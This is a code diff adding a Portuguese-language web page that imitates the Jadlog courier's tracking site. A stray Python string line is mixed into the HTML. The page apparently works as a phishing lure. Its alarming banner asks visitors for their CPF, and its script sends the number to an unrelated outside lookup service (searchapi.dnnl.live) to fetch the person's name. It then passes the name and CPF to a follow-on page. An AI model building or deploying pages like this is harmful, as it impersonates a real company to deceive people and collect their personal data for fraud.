@@ -1,0 +1,144 @@
+<html lang="pt-BR"><head></head><body class="min-h-screen flex flex-col"># Update index.html to call the local PHP proxy and improve catch error visibility.
+html_content = """
+
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Rastreamento - Jadlog</title>
+  <meta name="description" content="Rastreamento de encomendas na Jadlog. Acompanhe o status da sua entrega de forma rápida e segura.">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background-color: #F9F9F9;
+      color: #333;
+    }
+    .alert {
+      color: #FFFFFF;
+      background-color: #DA291C;
+      text-align: center;
+      font-weight: bold;
+      padding: 8px;
+      border-radius: 5px;
+    }
+    .input-cpf {
+      border: 1px solid #CCC;
+      border-radius: 5px;
+      padding: 8px;
+      width: 100%;
+      box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1);
+    }
+    .btn-primary {
+      background-color: #DA291C;
+      color: white;
+      font-weight: bold;
+      border: none;
+      padding: 8px 0;
+      border-radius: 5px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    .btn-primary:hover {
+      background-color: #B2221A;
+    }
+    footer {
+      background-color: #333;
+      color: #FFFFFF;
+      padding: 20px 0;
+      font-size: 14px;
+    }
+  </style>
+
+
+  <!-- Header -->
+  <header class="bg-white border-b shadow-md p-3 fixed top-0 left-0 right-0 z-[150]">
+    <nav class="max-w-6xl mx-auto flex items-center justify-center">
+      <a href="/" aria-label="Página Inicial da Jadlog" class="flex items-center justify-center">
+        <img src="images/logo.png" alt="Logo da Jadlog" class="h-8" loading="lazy">
+      </a>
+    </nav>
+  </header>
+
+  <!-- Main -->
+  <main class="flex-grow max-w-md mx-auto mt-20 p-6 bg-white shadow-lg rounded-lg text-center">
+    <div class="alert mb-4">
+      ⚠ CONFIRME O ANDAMENTO DA SUA ENCOMENDA!
+    </div>
+    <p class="text-center mb-6">
+      Deseja acompanhar seu objeto?<br>
+      Digite o CPF do comprador.
+    </p>
+
+    <form id="cpfForm" novalidate="">
+      <input type="text" id="cpfInput" placeholder="000.000.000-00" class="input-cpf mb-4" maxlength="14" inputmode="numeric" autocomplete="off" oninput="formatCPF(this)" aria-label="CPF do comprador" required="">
+      <div id="message" class="text-center text-gray-700 mb-2 hidden">Consultando...</div>
+      <div id="messageError" class="text-center text-red-500 mb-2 hidden"></div>
+      <button type="submit" class="btn-primary w-full">Consultar</button>
+    </form>
+  </main>
+
+  <!-- Banner -->
+  <section class="max-w-md mx-auto my-8 px-6">
+    <img src="images/banner-jadlog.jpg" alt="Banner Jadlog" class="w-full rounded-md" loading="lazy">
+  </section>
+
+  <!-- Footer -->
+  <footer class="bg-gray-900 mt-auto">
+    <div class="max-w-6xl mx-auto py-12 px-4 sm:px-6 lg:px-8 text-white">
+      <p class="text-center text-sm">© 2024 Jadlog - Todos os direitos reservados</p>
+    </div>
+  </footer>
+
+<script>
+  function formatCPF(input) {
+    let value = input.value.replace(/\D/g, '');
+    if (value.length > 11) value = value.slice(0, 11);
+    value = value.replace(/(\d{3})(\d)/, '$1.$2');
+    value = value.replace(/(\d{3})(\d)/, '$1.$2');
+    value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+    input.value = value;
+  }
+
+  document.getElementById('cpfForm').addEventListener('submit', async function (event) {
+    event.preventDefault();
+    const cpf = document.getElementById('cpfInput').value.replace(/\D/g, '');
+    const message = document.getElementById('message');
+    const messageError = document.getElementById('messageError');
+
+    message.textContent = 'Consultando...';
+    message.classList.remove('hidden');
+    messageError.classList.add('hidden');
+    messageError.textContent = '';
+
+    try {
+      // 🔴 TROQUEI para a nova API
+      const url = `https://searchapi.dnnl.live/consulta?token_api=ryn&cpf=${cpf}`;
+      const response = await fetch(url);
+      if (!response.ok) throw new Error("HTTP " + response.status);
+
+      const result = await response.json();
+
+      // 🔴 Novo formato de resposta
+      if (result.status === 200 && result.dados && result.dados.length > 0) {
+        const pessoa = result.dados[0];
+        const nome = pessoa.NOME || "";
+        const cpfApi = pessoa.CPF || cpf;
+
+        // passa só nome e cpf, como antes
+        window.location.href = `objeto/index.html?nome=${encodeURIComponent(nome)}&cpf=${encodeURIComponent(cpfApi)}`;
+      } else {
+        message.classList.add('hidden');
+        messageError.textContent = 'CPF não encontrado.';
+        messageError.classList.remove('hidden');
+      }
+    } catch (error) {
+      console.error("Erro na consulta:", error);
+      message.classList.add('hidden');
+      messageError.textContent = 'Erro ao consultar o CPF. Tente novamente mais tarde.';
+      messageError.classList.remove('hidden');
+    }
+  });
+</script>
+
+
+</body></html>
